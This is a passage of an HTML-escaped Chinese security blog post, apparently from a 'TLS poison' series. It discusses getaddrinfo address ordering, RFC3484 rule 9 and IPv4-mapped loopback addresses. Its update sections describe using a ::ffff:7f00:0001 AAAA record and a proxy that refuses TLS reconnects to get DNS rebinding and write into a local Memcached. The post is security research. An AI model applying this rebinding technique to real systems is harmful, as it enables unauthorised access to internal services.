&#xFF0C;&#x8C03;&#x7528;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF08;&#x4EE5;&#x53CA;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6240;&#x4F9D;&#x8D56;&#x7684;&#x5176;&#x4ED6;&#x5806;&#x6808;&#xFF09;&#x5C06;&#x5E94;&#x5BF9;&#x5F97;&#x5230;&#x4E00;&#x5806; AF_INET6 &#x800C;&#x4E0D;&#x662F; AF_INET &#x7684;&#x8FD4;&#x56DE;&#x3002;&#x56E0;&#x6B64;&#x5BF9;&#x4E8E; IPv6 &#xFF0C;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x63A5;&#x53E3;&#x3002;&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;&#xFF08;&#x5728; RFC3493 s6.1&#x548C;&#x5B83;&#x7684;&#x524D;&#x8EAB;&#x4E2D;&#x5B9A;&#x4E49;&#xFF09;&#x5C31;&#x662F; getaddrinfo &#x3002;</p><p>&#x5B83;&#x6709;&#x51E0;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#xFF0C;&#x5176;&#x4E2D;&#x5927;&#x90E8;&#x5206;&#x4E0E;&#x8FD9;&#x91CC;&#x65E0;&#x5173;&#x3002;&#x5173;&#x952E;&#x7684;&#x65B0;&#x529F;&#x80FD;&#x662F;&#xFF1A;getaddrinfo &#x5141;&#x8BB8;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6307;&#x5B9A;&#x5B83;&#x662F;&#x5426;&#x53EA;&#x60F3;&#x83B7;&#x5F97; IPv4 &#x5730;&#x5740;&#xFF0C;&#x8FD8;&#x662F;&#x4E5F;&#x60F3;&#x83B7;&#x5F97; IPv6 &#x5730;&#x5740;&#xFF0C;&#x5982;&#x679C;&#x83B7;&#x5F97;&#x6DF7;&#x5408;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x5C06;&#x5176;&#x7F16;&#x7801;&#x4E3A; AF_INET &#xFF0C;&#x8FD8;&#x662F;&#x5C06;&#x5176;&#x7F16;&#x7801;&#x4E3A; &#x201C;v6-mapped &#x201C;AF_INET6&#xFF08;&#x8FD9;&#x91CC;&#x5C31;&#x662F; IPv4-mapped IPv6 Addresses &#xFF09;&#x3002;&#x7ED3;&#x5408;&#x5176;&#x4ED6;&#x5404;&#x79CD;&#x65B0;&#x7684;&#x7279;&#x70B9;&#xFF0C;&#x8FD9;&#x4F7F;&#x5F97;&#x5C06;&#x4E00;&#x4E2A;&#x4EC5;&#x6709; IPv4 &#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8F6C;&#x6362;&#x4E3A; IPv6 &#x529F;&#x80FD;&#x53D8;&#x5F97;&#x76F8;&#x5F53;&#x7B80;&#x5355;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x603B;&#x7684;&#x6765;&#x8BF4;&#xFF1A;getaddrinfo &#x662F;&#x7528;&#x6765;&#x53D6;&#x4EE3; gethostbyname &#x7684;&#x3002;</p><p>&#x7136;&#x800C;&#xFF0C;&#x53E6;&#x5916;&#xFF0C;&#x4EBA;&#x4EEC;&#x610F;&#x8BC6;&#x5230;&#xFF0C;&#x5982;&#x679C; getaddrinfo &#x53EF;&#x4EE5;&#x8FD4;&#x56DE; IPv4 &#x548C; v6 &#x5730;&#x5740;&#x7684;&#x6DF7;&#x5408;&#x7269;&#xFF0C;&#x90A3;&#x4E48;&#x6709;&#x5FC5;&#x8981;&#x6307;&#x5B9A;&#x5B83;&#x4EEC;&#x7684;&#x8FD4;&#x56DE;&#x987A;&#x5E8F;&#x3002;&#x5F53; RFC3484 &#x7F16;&#x5199;&#x65F6;&#xFF0C;&#x4F5C;&#x8005;&#x663E;&#x7136;&#x8BA4;&#x4E3A;&#x6700;&#x597D;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5728;&#x6240;&#x6709;&#x5730;&#x5740;&#x4E0A;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x5C06;&#x5B9A;&#x4E49;&#x54EA;&#x4E2A;&#x5730;&#x5740;&#x662F;&#x9996;&#x9009;&#x3002; RFC3484 &#x7684;&#x4F5C;&#x8005;&#x4E0D;&#x7BA1;&#x4E0A;&#x9762;&#x6240;&#x63CF;&#x8FF0;&#x7684;&#x5BF9; DNS &#x5FAA;&#x73AF;&#x529F;&#x80FD;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x6307;&#x5B9A;&#xFF08;&#x7B2C;6&#x6761;&#x89C4;&#x5219;9&#xFF09;&#x6240;&#x6709;&#x5730;&#x5740;&#x5E94;&#x8BE5;&#x6309;&#x7167;&#x4E0E;&#x505A;&#x51FA;&#x9009;&#x62E9;&#x7684;&#x4E3B;&#x673A;&#x7684; &#x201C;&#x63A5;&#x8FD1;&#x5EA6; &#x201C;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x2013;&#x5176;&#x4E2D; &#x201C;&#x63A5;&#x8FD1;&#x5EA6; &#x201C;&#x88AB;&#x5B9A;&#x4E49;&#x4E3A;&#x666E;&#x901A;&#x521D;&#x59CB;&#x5730;&#x5740;&#x524D;&#x7F00;&#x7684;&#x957F;&#x5EA6;&#x3002;</p><p>&#x8FD9;&#x5728; 3484 &#x5236;&#x5B9A;&#x4E4B;&#x65F6;&#xFF0C;&#x5BF9;&#x4E8E; IPv6 &#x7684;&#x771F;&#x5B9E;&#x7F51;&#x7EDC;&#x8FD1;&#x4F3C;&#x6027;&#x53EF;&#x80FD;&#x662F;&#x4E00;&#x4E2A;&#x6709;&#x4E89;&#x8BAE;&#x7684;&#x5B9A;&#x4E49;&#xFF0C;&#x4F46;&#x73B0;&#x5728;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x5728;&#x771F;&#x5B9E;&#x7684;IPv6&#x4E92;&#x8054;&#x7F51;&#x4E2D;&#xFF0C;&#x5B83;&#x4E0D;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x8861;&#x91CF;&#x6807;&#x51C6;&#xFF0C;&#x5728;IPv4&#x4E92;&#x8054;&#x7F51;&#x4E2D;&#x4E5F;&#x4ECE;&#x6765;&#x6CA1;&#x6709;&#x8FD9;&#x6837;&#x7684;&#x8861;&#x91CF;&#x6807;&#x51C6;&#x3002;&#x6240;&#x4EE5; RFC3484 s6 &#x89C4;&#x5219; 9 &#x5C31;&#x662F;&#x9519;&#x8BEF;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x80CC;&#x540E;&#x7684;&#x539F;&#x56E0;&#x5373;&#x4F7F;&#x66FE;&#x7ECF;&#x9002;&#x7528;&#x73B0;&#x5728;&#x4E5F;&#x4E0D;&#x518D;&#x9002;&#x7528;&#x4E86;&#x3002;&#x7136;&#x800C;&#xFF0C;&#x6BD4;&#x8FD9;&#x66F4;&#x7CDF;&#x7CD5;&#x7684;&#x662F;&#xFF1A;&#x89C4;&#x5219; 9&#x3002;&#x8BD5;&#x56FE;&#x6539;&#x53D8;&#x73B0;&#x6709;&#x7CFB;&#x7EDF;&#x7684;&#x884C;&#x4E3A;&#x3002;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x540C;&#x610F;&#x89C4;&#x5219; 9&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x4E5F;&#x5E94;&#x8BE5;&#x540C;&#x6837;&#x9002;&#x7528;&#x4E8E;&#x4F7F;&#x7528; gethostbyname&#x3002;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;&#x6240;&#x6709;&#x4F7F;&#x7528; gethostbyname &#x7684;&#x73B0;&#x6709;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x90FD;&#x4E0D;&#x7B26;&#x5408;&#x89C4;&#x5219;9&#x3002;&#x4E5F;&#x8BB8;&#x53EF;&#x4EE5;&#x4FEE;&#x6539; gethostbyname&#xFF0C;&#x4F7F;&#x5176;&#x6839;&#x636E; RFC3484 s5 &#x548C; s6 &#x5BF9;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x4F46;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x597D;&#x4E3B;&#x610F;&#x5417;&#xFF1F;&#x4E0D;&#xFF0C;&#x663E;&#x7136;&#x4E0D;&#x662F;&#x3002;&#x8FD9;&#x5C06;&#x6539;&#x53D8;&#x6240;&#x6709;&#x76EE;&#x524D;&#x4F7F;&#x7528; gethostbyname &#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x884C;&#x4E3A;&#x3002;&#x76EE;&#x524D;&#xFF0C;&#x8FD9;&#x4E9B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F; &#x201C;&#x968F;&#x673A; &#x201C;&#x5730;&#x9009;&#x62E9;&#x5730;&#x5740;&#xFF08;&#x6839;&#x636E; DNS &#x5FAA;&#x73AF;&#xFF09;&#x3002;&#x89C4;&#x5219; 9 &#x4F1A;&#x8BA9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6839;&#x636E;&#x6700;&#x957F;&#x901A;&#x7528;&#x524D;&#x7F00;&#x6765;&#x9009;&#x62E9;&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x5C06;&#x7834;&#x574F;&#x57FA;&#x4E8E; DNS &#x7684;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x673A;&#x5236;&#x3002;&#x90A3;&#x4E48; getaddrinfo &#x5462;&#xFF1F; &#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x7406;&#x7531;&#x4E3A;&#x4E86;&#x589E;&#x52A0;&#x65B0;&#x529F;&#x80FD;&#x5F7B;&#x5E95;&#x5730;&#x6539;&#x53D8;&#x8BE5; API &#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x6211;&#x4EEC;&#x770B;&#x5230;&#xFF0C;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x670D;&#x52A1;&#x5668;&#x7684; DNS &#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5DF2;&#x7ECF;&#x88AB;&#x8FD9;&#x4E2A;&#x53D8;&#x5316;&#x6253;&#x7834;&#x4E86;! &#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4ECE;&#x4F7F;&#x7528;&#x975E;&#x89C4;&#x5219; 9 &#x7684; gethostbyname &#x6539;&#x4E3A;&#x89C4;&#x5219; 9 &#x7684; getaddrinfo &#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x51FA;&#x73B0;&#x6BD4;&#x8F83;&#x4E25;&#x91CD;&#x7684;&#x975E;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x3002;</p><p>RFC &#x8BD5;&#x56FE;&#x89C4;&#x5B9A;&#x4EE5;&#x53EF;&#x9884;&#x6D4B;&#x7684;&#x987A;&#x5E8F;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x662F;&#x4E0D;&#x5408;&#x7406;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x51E0;&#x5341;&#x5E74;&#x6765;&#x6574;&#x4E2A;&#x4E92;&#x8054;&#x7F51;&#x6240;&#x4F9D;&#x8D56;&#x7684;&#x65E2;&#x5B9A;&#x884C;&#x4E3A;&#x662F;&#x5730;&#x5740;&#x4E0D;&#x662F;&#x4EE5;&#x53EF;&#x9884;&#x6D4B;&#x7684;&#x987A;&#x5E8F;&#x8FD4;&#x56DE;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x8FD9;&#x91CC;&#x7684;&#x4E0D;&#x53EF;&#x9884;&#x6D4B;&#x6027;&#x4E0D;&#x662F;&#x5076;&#x7136;&#x7684;&#x3002;&#x5728; DNS &#x8F6E;&#x8BE2;&#x51FA;&#x73B0;&#x4E4B;&#x524D;&#xFF0C;&#x5730;&#x5740;&#x603B;&#x662F;&#x6309;&#x7167; DNS &#x533A;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x6307;&#x5B9A;&#x7684;&#x987A;&#x5E8F;&#x8FD4;&#x56DE;&#xFF0C;&#x7279;&#x6B8A;&#x7684;&#x4EE3;&#x7801;&#x88AB;&#x6DFB;&#x52A0;&#x5230; namervers &#x4E2D; (&#x51E0;&#x5341;&#x5E74;&#x524D;)&#xFF0C;&#x4EE5; &#x201C;&#x968F;&#x673A;&#x5316; &#x201C;&#x8FD9;&#x4E2A;&#x987A;&#x5E8F;&#x3002; getaddrinfo &#x4E0D;&#x5E94;&#x8BE5;&#x53D6;&#x6D88;&#x8FD9;&#x4E2A;&#x63AA;&#x65BD;&#x3002;&#x6B63;&#x5982;&#x4E0A;&#x9762;&#x6240;&#x5C55;&#x793A;&#x7684;&#xFF0C;RFC&#x662F;&#x9519;&#x8BEF;&#x7684;&#xFF0C;&#x4E0E;&#x73B0;&#x6709;&#x7684;&#x5B9E;&#x8DF5;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x800C;&#x4E14;&#x6240;&#x63D0;&#x51FA;&#x7684;&#x9075;&#x5B88;&#x5B83;&#x7684;&#x65B9;&#x5F0F;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x6709;&#x4E24;&#x4E2A;&#x7C7B;&#x4F3C;&#x7684;&#x63A5;&#x53E3;&#xFF08; gethostbyname &#x548C; getaddrinfo &#xFF09;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x884C;&#x4E3A;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x5B9A;&#x4E49; getaddrinfo &#x7684;&#x6587;&#x6863;&#x662F; RFC 3493&#xFF0C;&#x800C; RFC 3493 &#x6CA1;&#x6709;&#x53C2;&#x8003; RFC 3484 &#xFF0C;&#x5B83;&#x6839;&#x672C;&#x6CA1;&#x6709;&#x63D0;&#x5230;&#x6392;&#x5E8F;&#x3002;&#x8BF7;&#x6CE8;&#x610F;&#xFF0C;RFC3484 &#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x3002;&#x5B83;&#x662F;&#x4E00;&#x4E2A; &#x201C;proposed standard&#x201D;&#x2013;&#x6700;&#x65E9;&#x7684; IETF &#x6807;&#x51C6;&#x8DDF;&#x8E2A;&#x6587;&#x4EF6;&#x72B6;&#x6001;&#x7684;&#x4E1C;&#x897F;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5EFA;&#x8BAE; RFC3484 &#x89C4;&#x5219; 9 &#x5E94;&#x88AB;&#x5E9F;&#x5F03;&#xFF0C;&#x5E76;&#x5E94;&#x88AB;&#x5E9F;&#x9664;&#xFF08;IPv4 &#x5E94;&#x8BE5;&#x8981;&#x5E9F;&#x9664;&#x8FD9;&#x4E2A;&#x89C4;&#x5219;&#xFF0C;IPv6 &#x53EF;&#x80FD;&#x4E5F;&#x9700;&#x8981;&#xFF09;&#x3002;</p><h2 id="Additional-Remarks"><a href="#Additional-Remarks" class="headerlink" title="Additional Remarks"></a>Additional Remarks</h2><h3 id="IPv4-Mapped-127-0-0-1"><a href="#IPv4-Mapped-127-0-0-1" class="headerlink" title="IPv4-Mapped 127.0.0.1"></a>IPv4-Mapped 127.0.0.1</h3><p>2021/05/14 &#x66F4;&#x65B0;&#xFF1A;</p><p>&#x5BF9;&#x4E8E; IPv4-mapped IPv6 &#x8FD9;&#x7C7B;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x8BA4;&#x4E3A;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x6B63;&#x610F;&#x4E49;&#x4E0A;&#x7684; v6 &#x5730;&#x5740;&#xFF0C;&#x771F;&#x6B63; v6 &#x7684; loopback &#x5730;&#x5740;&#x4E3A; ::1 &#xFF0C;IPv4-mapped IPv6 &#x53EA;&#x662F; IPv4 &#x5730;&#x5740;&#x5199;&#x6210; IPv6 &#x5F62;&#x5F0F;&#x3002;&#x90A3;&#x4E48;&#x65E2;&#x7136;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x6B63;&#x7684; IPv6 &#xFF0C;&#x4F46;&#x662F;&#x5199;&#x4F5C;&#x4E86; IPv6 &#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x5BF9;&#x4E8E;<code>getaddrinfo</code>&#x6765;&#x8BF4;&#xFF0C;&#x4ED6;&#x786E;&#x5B9E;&#x662F; IPv6 &#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x4E8E; IPv6 &#x6765;&#x8BF4;&#xFF0C;&#x771F;&#x6B63;&#x7684;&#x56DE;&#x73AF;&#x5730;&#x5740;&#x5E76;&#x4E0D;&#x662F;&#x8FD9;&#x4E2A;&#xFF0C;&#x6240;&#x4EE5;&#x4ED6;&#x53EF;&#x80FD;&#x88AB;&#x89C6;&#x4E3A;&#x666E;&#x901A;&#x7684; IPv6 &#x5730;&#x5740;&#x5904;&#x7406;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x9A8C;&#x8BC1;&#x4E00;&#x4E0B;&#x81EA;&#x5DF1;&#x7684;&#x60F3;&#x6CD5;&#xFF1A;&#x76F4;&#x63A5;&#x5728;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x4E0A;&#x540C;&#x65F6;&#x8BBE;&#x7F6E; AAAA &#x8BB0;&#x5F55;&#x4E3A; ::ffff:7f00:0001 &#xFF0C;A &#x8BB0;&#x5F55;&#x4E3A;&#x968F;&#x610F;&#x4E00;&#x4E2A; IPv4 &#x516C;&#x7F51;&#x5730;&#x5740;&#x3002;</p><p>&#x4F7F;&#x7528; curl &#x8BF7;&#x6C42;&#x6211;&#x4EEC;&#x8BBE;&#x7F6E;&#x7684;&#x57DF;&#x540D;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/11.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x5730;&#x5740;&#x662F;&#x968F;&#x673A;&#x8FD4;&#x56DE;&#x7684;&#x3002;</p><p>&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x91CD;&#x65B0; debug &#x4E00;&#x904D; getaddrinfo &#x51FD;&#x6570;&#xFF0C;&#x9A8C;&#x8BC1;&#x4E00;&#x4E0B;&#x81EA;&#x5DF1;&#x7684;&#x60F3;&#x6CD5;&#x3002;&#x4E8E;&#x662F;&#xFF0C;&#x91CD;&#x65B0; debug &#x4E86;&#x4E00;&#x904D; libc &#x5F53;&#x4E2D;&#x7684; rfc3484_sort &#x51FD;&#x6570;&#xFF0C;&#x5BF9;&#x4E8E; ::ffff:7f00:0001 &#x5730;&#x5740;&#x6765;&#x8BF4;&#xFF0C; getaddrinfo &#x4F7F;&#x7528;&#x4E86; IPv6 &#x7ED3;&#x6784;&#x4F53;&#x5904;&#x7406;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#xFF0C;&#x4F46;&#x662F;&#x6700;&#x540E;&#x7ED3;&#x679C;&#x662F;&#x6309;&#x7167; DNS &#x5F97;&#x5230;&#x7684;&#x539F;&#x987A;&#x5E8F;&#x8FD4;&#x56DE;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x4E0E; IPv4 vps &#x5730;&#x5740;&#x4E00;&#x8D77;&#x51FA;&#x73B0;&#x65F6;&#xFF0C;&#x5BF9;&#x4E8E;getaddrinfo &#x6765;&#x8BF4;&#x662F;&#x968F;&#x673A;&#x8FD4;&#x56DE;&#x3002;&#x6240;&#x4EE5;&#x4ECE;&#x7ED3;&#x679C;&#x6765;&#x770B;&#xFF0C;&#x4ED6;&#x786E;&#x5B9E;&#x88AB;&#x89C6;&#x4E3A;&#x4E86;&#x8DDF; v4 vps &#x76F8;&#x540C;&#x4F18;&#x5148;&#x7EA7;&#x7684;&#x5730;&#x5740;&#x3002;</p><p>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x5B9E;&#x9645;&#x4E0A;&#x5E94;&#x4E0D;&#x5E94;&#x8BE5;&#x8FD9;&#x4E48;&#x5904;&#x7406;&#x5462;&#xFF1F;&#x6309;&#x7167; RFC 6742 &#x7684;&#x8BF4;&#x6CD5;&#xFF1A;</p><blockquote><p>&#x200B;    IPv4-compatible addresses [RFC4291], IPv4-mapped [RFC4291], IPv4-converted [RFC6145], IPv4-translatable [RFC6145], and 6to4 addresses [RFC3056] contain an embedded IPv4 address. For the purposes of this document, these addresses MUST be treated as having global scope.</p></blockquote><p>IPv4-mapped &#x8FD9;&#x7C7B;&#x5730;&#x5740;&#x5E94;&#x8BE5;&#x88AB;&#x89C6;&#x4E3A;&#x62E5;&#x6709; global scope &#xFF0C;&#x800C;&#x771F;&#x6B63;&#x610F;&#x4E49;&#x4E0A;&#x7684;&#x56DE;&#x73AF;&#x5730;&#x5740;&#x5E94;&#x8BE5;&#x662F;&#x88AB;&#x4F5C;&#x4E3A; link-local scope &#x5904;&#x7406;&#x7684;&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x57FA;&#x672C;&#x80FD;&#x89E3;&#x91CA;&#x4E3A;&#x4EC0;&#x4E48;&#x4ED6;&#x4F1A;&#x88AB;&#x4F5C;&#x4E3A;&#x4E0E; v4 vps &#x8FD9;&#x7C7B;&#x5730;&#x5740;&#x4E00;&#x6837;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x4E86;&#x3002;</p><p>&#x6240;&#x4EE5;&#x4E4B;&#x524D;&#x6587;&#x4E2D;&#x7684;&#x8BF4;&#x6CD5;&#x4E0D;&#x5E94;&#x8BE5;&#x628A; ::ffff:7f00:0001 &#x4E0E; 127.0.0.1 &#x89C6;&#x4E3A;&#x540C;&#x7C7B;&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x4E00;&#x70B9;&#x662F;&#x9519;&#x8BEF;&#x7684;&#x3002;</p><h3 id="IPv4-Mapped-With-Memcached"><a href="#IPv4-Mapped-With-Memcached" class="headerlink" title="IPv4-Mapped With Memcached"></a>IPv4-Mapped With Memcached</h3><p>2021/05/14 &#x66F4;&#x65B0;&#xFF1A;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#x4F7F;&#x7528; IPv4-Mapped &#x8FD9;&#x7C7B;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x5B9E;&#x9A8C;&#x770B;&#x770B;&#x80FD;&#x4E0D;&#x80FD;&#x5199;&#x5165; Memcached&#xFF0C;&#x540C;&#x6837;&#x7684; DNS &#x914D;&#x7F6E;&#xFF1A;&#x5728;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x4E0A;&#x540C;&#x65F6;&#x8BBE;&#x7F6E; AAAA &#x8BB0;&#x5F55;&#x4E3A; ::ffff:7f00:0001 &#xFF0C;A &#x8BB0;&#x5F55;&#x4E3A;&#x968F;&#x610F;&#x4E00;&#x4E2A; IPv4 &#x516C;&#x7F51;&#x5730;&#x5740;&#x3002;</p><p>&#x7136;&#x540E;&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&#x57FA;&#x672C;&#x540C;&#x53CC; A &#x8BB0;&#x5F55;&#x5B9E;&#x9A8C;&#x65B9;&#x5F0F;&#x4E00;&#x81F4;&#xFF0C;&#x4F7F;&#x7528; proxy.py &#x62D2;&#x7EDD;&#x5BA2;&#x6237;&#x7AEF;&#x5BF9; TLS &#x670D;&#x52A1;&#x7AEF;&#x7684;&#x7B2C;&#x4E8C;&#x6B21;&#x8BF7;&#x6C42;&#x4EE5;&#x8FBE;&#x5230; DNS Rebinding &#x7684;&#x6548;&#x679C;&#xFF0C;&#x4E8E;&#x662F;&#x5F97;&#x5230;&#x7684;&#x5B9E;&#x9A8C;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEF